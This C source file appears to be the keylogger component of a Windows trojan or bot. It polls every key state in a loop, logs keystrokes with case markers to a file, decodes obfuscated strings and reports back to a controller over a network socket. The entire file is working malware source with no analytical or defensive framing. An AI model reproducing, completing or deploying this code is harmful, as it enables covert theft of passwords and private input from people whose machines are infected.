#include "stuff.h"
#include "externals.h"
#include "keys.h"

#ifndef NO_KEYLOGGER

void KL_DecodeKeys()
{
	unsigned int	i;

	for (i = 0; keys[i].vKey != 0; i++)
	{
		DecodeSemiString(keys[i].display);
	}
}


bool KL_GetKeys(char *filedest)
{
	int		character;
	FILE	*file;
	short	i, d = -32767;
	int		caps, shift;
	char	buff[32];
    
	while(1)
    {
		Sleep(9);

        for (character = 8; character <= 222; character++)
        {
			i = fGetAsyncKeyState(character);

			if (i == d)
            {          
				//printf("Pressed: %d\n", character);
				if ((file = fopen(filedest,"a+")) == NULL)
					return FALSE; 

				caps = fGetKeyState(VK_CAPITAL);
				shift = fGetKeyState(VK_SHIFT);
				memset(buff, 0, sizeof(buff));

				if ((character >= 48) && (character <= 57))
				{
					// caps on, shift off				caps off, shift on
					if ((caps == 1 && shift >= 0) || (caps == 0 && shift < 0))
						sprintf(buff, "[U]");
					sprintf(buff, "%s%c", buff, character);
#ifdef DEBUG
					printf("%s\n", buff);
#endif
					fputs(buff, file);
				}
				else if ((character >= 65) && (character <= 90))
				{
					if ((caps == 1 && shift >= 0) || (caps == 0 && shift < 0))
						sprintf(buff, "[U]");
					sprintf(buff, "%s%c", buff, character);
#ifdef DEBUG
					printf("%s\n", buff);
#endif
					fputs(buff, file);
				}
                else
                {
					for (i = 0; keys[i].vKey != 0; i++)
					{
						if (keys[i].vKey == character)
						{
#ifdef DEBUG
							printf("%s\n", keys[i].display);
#endif
							fputs(keys[i].display, file);
							break;
						}
					} 
				}
				fclose(file);
			}   
		}                                 
	}
	
	return true;
}

DWORD WINAPI KL_Thread(LPVOID param)
{
	keylogger_s k = *((keylogger_s *)param);

	if (!KL_GetKeys(k.filedest))
		NET_Send(k.sock, KEYLOGGERACTION, strings[Decode(s_failed)].encoded);

	ExitThread(0);
}

#endif